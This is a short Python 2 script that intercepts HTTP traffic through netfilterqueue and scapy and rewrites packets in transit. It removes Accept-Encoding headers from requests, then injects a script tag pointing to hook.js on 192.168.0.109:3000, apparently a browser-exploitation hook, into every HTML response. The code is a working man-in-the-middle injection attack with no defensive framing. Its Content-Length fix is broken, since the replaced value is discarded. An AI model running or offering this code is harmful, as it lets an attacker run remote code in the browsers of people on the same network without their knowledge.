import scapy.all as scapy
import netfilterqueue
import re

def set_load (pkt, load):
    pkt[scapy.Raw].load = load
    del pkt[scapy.IP].len
    del pkt[scapy.IP].chksum
    del pkt[scapy.TCP].chksum
    return pkt


def process_packet(packet):
    scapy_pkt = scapy.IP(packet.get_payload())
    if scapy_pkt.haslayer(scapy.Raw):
        load = scapy_pkt[scapy.Raw].load
        if scapy_pkt[scapy.TCP].dport == 80:
            print "HTTP Request"
            load = re.sub("(Accept-Encoding:.*?\\r\\n)", "", load)

        elif scapy_pkt[scapy.TCP].sport == 80:
            print "HTTP Response"
            #print scapy_pkt.show()
            injection_code = '<script src="http://192.168.0.109:3000/hook.js"></script>'
            load = load.replace("</head>", injection_code + "</head>")
            content_length_search = re.search("(?:Content-Length:\s)([0-9]*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load.replace(content_length, str(new_content_length))
                print content_length


        if load != scapy_pkt[scapy.Raw].load:
            new_packet = set_load(scapy_pkt, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()